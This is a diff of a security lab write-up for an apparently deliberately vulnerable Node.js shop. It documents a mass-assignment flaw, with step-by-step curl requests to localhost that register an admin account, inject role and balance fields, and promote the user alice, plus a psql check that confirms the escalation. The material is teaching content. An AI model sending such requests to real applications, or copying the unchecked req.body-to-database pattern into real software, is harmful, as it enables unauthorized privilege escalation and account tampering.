@@ -6,33 +6,46 @@ Registration and the profile form forward the whole request body to the database
 
 **Code:** `routes/auth.js` (`/register`), `routes/account.js` (`/account`), `model/db.js` (`updateProfile`), `views/register.ejs`
 
-## Exploit 1: register as admin
+## Exploit
 
-The register form shows a `role` field (the lab makes the vector obvious; a real attack adds the field to a crafted POST):
+1. Register as admin. The register form shows a `role` field (the lab makes the vector obvious):
 
 ```bash
 curl -s -X POST http://localhost:8888/register \
   -d "username=pwn&password=pwn123&role=admin"
 ```
 
-## Exploit 2: promote yourself from the profile form
-
-Log in as alice, then:
+2. In a real app the form would not render that field. It would not matter — send the field anyway:
 
 ```bash
+curl -s -X POST http://localhost:8888/register \
+  -d "username=pwn2&password=pwn123&email=x@x.com" \
+  -d "role=admin&balance=999999"
+```
+
+3. Promote an existing account from the profile form (log in as alice, then):
+
+```bash
+curl -s -c cookies.txt -X POST http://localhost:8888/login/auth \
+  -d "username=alice" -d "password=alice123"          # get a session
+
 curl -s -b cookies.txt -X POST http://localhost:8888/account \
   --data "email=alice%40example.com" --data "role=admin" --data "balance=999999"
 ```
 
-Alice is now `admin` with a 9,999.99 € balance — confirm in the UI or:
+4. Confirm the escalation:
 
-```sql
-SELECT username, role, balance FROM users WHERE username = 'alice';
+```bash
+docker compose exec db psql -U nodebazaar -d nodebazaar \
+  -c "SELECT username, role, balance FROM users WHERE username = 'alice';"
+# alice | admin | 999999
 ```
+
+The Account page now shows role `admin` and balance 9,999.99 € — and if an admin area existed, she would be in.
 
 ## Why it happens
 
-`req.body` → database without an allowlist. The form does not render a field? Send it anyway — the server never checks.
+`req.body` → database without an allowlist. The form does not render a field? Send it anyway — the server never checks. Framework model binders make this a one-line bug (`Object.assign(user, req.body)` is the same disease).
 
 ## Fix
 
